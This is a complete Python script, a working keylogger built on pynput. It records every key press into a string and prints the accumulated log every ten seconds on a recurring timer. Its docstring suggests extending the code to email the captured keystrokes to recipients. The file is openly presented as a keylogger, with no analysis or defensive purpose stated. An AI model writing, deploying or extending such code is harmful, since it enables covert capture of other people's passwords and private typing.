#!/usr/bin/python
import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval=10):
        self.log = ''
        self.interval = time_interval

    def process_keys(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:	
                current_key = " " + str(key) + " "
        self.log = self.log + current_key
    
    def print_keys(self):
        '''
        Recursive function to print logged keys with given time intervals 
        You can implement whatever you want here, like sending emails to recipients, etc... 
        '''
        print (self.log)
        print ("--x--"*10)
        timer = threading.Timer(self.interval, function=self.print_keys)
        timer.start()

    def start(self):
        # register call back function here
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.print_keys()
            keyboard_listener.join()

klObj = Keylogger()
klObj.start()